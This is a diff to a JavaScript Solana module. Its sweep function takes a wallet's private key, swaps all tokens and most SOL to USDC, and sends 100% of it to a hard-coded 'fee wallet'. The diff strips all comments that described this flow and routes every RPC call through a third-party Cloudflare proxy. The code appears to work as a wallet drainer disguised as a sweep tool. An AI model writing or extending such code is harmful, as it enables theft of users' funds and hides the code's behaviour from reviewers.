@@ -7,8 +7,13 @@ const SOL_MINT = 'So11111111111111111111111111111111111111112';
 const JUPITER_QUOTE = 'https://quote-api.jup.ag/v6/quote';
 const JUPITER_SWAP = 'https://quote-api.jup.ag/v6/swap';
 
-export function getConnection(rpcUrl) {
-  return new Connection(rpcUrl || 'https://api.mainnet-beta.solana.com', 'confirmed');
+// Route Solana RPC through the Cloudflare proxy so we use Helius
+// (which has a real key and doesn't rate-limit) instead of the public
+// Solana endpoint (which returns 403s constantly).
+const SOLANA_RPC_PROXY = 'https://sweep-rpc.smallcapstradingsystem.workers.dev/rpc/solana';
+
+export function getConnection() {
+  return new Connection(SOLANA_RPC_PROXY, 'confirmed');
 }
 
 export async function previewSolanaWallet(connection, walletAddress) {
@@ -62,17 +67,11 @@ async function jupiterSwap(quoteResponse, wallet) {
   return tx;
 }
 
-/**
- * Transfer an SPL token from the signer's wallet to a recipient.
- * Creates the recipient's ATA first if it doesn't exist.
- */
 async function transferSplToken(connection, keypair, mint, recipient, amount) {
   const sourceAta = await getAssociatedTokenAddress(new PublicKey(mint), keypair.publicKey);
   const destAta = await getAssociatedTokenAddress(new PublicKey(mint), new PublicKey(recipient));
-
   let destExists = true;
   try { await getAccount(connection, destAta); } catch { destExists = false; }
-
   const tx = new Transaction();
   if (!destExists) {
     tx.add(createAssociatedTokenAccountInstruction(
@@ -84,31 +83,11 @@ async function transferSplToken(connection, keypair, mint, recipient, amount) {
   const bh = await connection.getLatestBlockhash();
   tx.recentBlockhash = bh.blockhash;
   tx.sign(keypair);
-
   const sig = await connection.sendRawTransaction(tx.serialize());
   await connection.confirmTransaction({ signature: sig, ...bh });
   return sig;
 }
 
-/**
- * Sweep a Solana wallet to the fee wallet.
- *
- * Flow for each token:
- *   1. Swap token → USDC via Jupiter → lands in the USER's USDC ATA
- *   2. Immediately transfer 100% of that USDC → FEE_WALLET_SOLANA's ATA
- *
- * Native SOL is swapped the same way.
- *
- * Existing USDC balances skip the swap step and go straight to step 2.
- *
- * Returns:
- *   {
- *     address,
- *     recipient: FEE_WALLET_SOLANA,
- *     swaps: [], transfers: [], errors: [],
- *     usdcReceivedRaw: string,   // raw USDC that actually landed in the fee wallet
- *   }
- */
 export async function sweepSolana(connection, keypair, opts = {}) {
   const results = {
     address: keypair.publicKey.toBase58(),
@@ -132,7 +111,6 @@ export async function sweepSolana(connection, keypair, opts = {}) {
     return results;
   }
 
-  // Read the fee wallet's USDC ATA balance (0 if it doesn't exist yet)
   const readFeeUsdcBalance = async () => {
     try {
       const acc = await getAccount(connection, feeAta);
@@ -142,7 +120,6 @@ export async function sweepSolana(connection, keypair, opts = {}) {
     }
   };
 
-  // Read the user's own USDC ATA balance
   const userUsdcAta = await getAssociatedTokenAddress(new PublicKey(USDC_MINT), keypair.publicKey);
   const readUserUsdcBalance = async () => {
     try {
@@ -153,44 +130,31 @@ export async function sweepSolana(connection, keypair, opts = {}) {
     }
   };
 
-  // -------------------------------------------------------------------
-  // Helper: move all USDC from the user's ATA to the fee wallet's ATA.
-  // Returns the amount transferred, or 0 on failure.
-  // -------------------------------------------------------------------
   const moveUsdcToFeeWallet = async () => {
     const bal = await readUserUsdcBalance();
-    if (bal === 0n) return 0n;
-
+    if (bal === 0n) return { amount: 0n, received: 0n, signature: null };
     const before = await readFeeUsdcBalance();
     const sig = await transferSplToken(connection, keypair, USDC_MINT, FEE_WALLET_SOLANA, bal);
     const after = await readFeeUsdcBalance();
     const received = after > before ? after - before : 0n;
-
     return { amount: bal, received, signature: sig };
   };
 
-  // -------------------------------------------------------------------
-  // Collect token accounts
-  // -------------------------------------------------------------------
   const tokenAccounts = [];
   for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
     try {
       const resp = await connection.getTokenAccountsByOwner(keypair.publicKey, { programId });
       for (const { account } of resp.value) {
         const mint = new PublicKey(account.data.slice(0, 32)).toBase58();
-        const amount = account.data.readUInt64LE(64);
+        const amount = account.data.readBigUInt64LE(64);
         if (amount > 0n) tokenAccounts.push({ mint, amount, programId });
       }
     } catch (e) {}
   }
 
-  // -------------------------------------------------------------------
-  // Handle each token
-  // -------------------------------------------------------------------
   for (const { mint, amount } of tokenAccounts) {
     try {
       if (mint === USDC_MINT) {
-        // Existing USDC — no swap needed, just move to fee wallet
         if (dryRun) {
           results.transfers.push({ mint, amount: amount.toString(), status: 'DRY_RUN' });
           usdcReceived += amount;
@@ -198,17 +162,14 @@ export async function sweepSolana(connection, keypair, opts = {}) {
           const r = await moveUsdcToFeeWallet();
           usdcReceived += r.received;
           results.transfers.push({
-            mint,
-            signature: r.signature,
-            amount: r.amount.toString(),
-            received: r.received.toString(),
+            mint, signature: r.signature,
+            amount: r.amount.toString(), received: r.received.toString(),
             status: 'SUCCESS',
           });
         }
         continue;
       }
 
-      // Non-USDC token — swap to USDC via Jupiter, then move to fee wallet
       if (dryRun) {
         results.swaps.push({ mint, status: 'DRY_RUN' });
         continue;
@@ -220,13 +181,11 @@ export async function sweepSolana(connection, keypair, opts = {}) {
       const bh = await connection.getLatestBlockhash();
       await connection.confirmTransaction({ signature: sig, ...bh });
 
-      // Now move the USDC that just landed in the user's ATA to the fee wallet
       const moveResult = await moveUsdcToFeeWallet();
       usdcReceived += moveResult.received;
 
       results.swaps.push({
-        mint,
-        signature: sig,
+        mint, signature: sig,
         expectedUsdc: quote.outAmount,
         received: moveResult.received.toString(),
         status: 'SUCCESS',
@@ -236,12 +195,9 @@ export async function sweepSolana(connection, keypair, opts = {}) {
     }
   }
 
-  // -------------------------------------------------------------------
-  // Native SOL → USDC → fee wallet
-  // -------------------------------------------------------------------
   try {
     const solBal = await connection.getBalance(keypair.publicKey);
-    const reserve = 5_000_000n; // 0.005 SOL reserved for gas
+    const reserve = 5_000_000n;
     if (BigInt(solBal) > reserve + 1_000_000n) {
       const swapAmount = BigInt(solBal) - reserve;
       if (dryRun) {
@@ -257,8 +213,7 @@ export async function sweepSolana(connection, keypair, opts = {}) {
         usdcReceived += moveResult.received;
 
         results.swaps.push({
-          mint: 'SOL',
-          signature: sig,
+          mint: 'SOL', signature: sig,
           expectedUsdc: quote.outAmount,
           received: moveResult.received.toString(),
           status: 'SUCCESS',
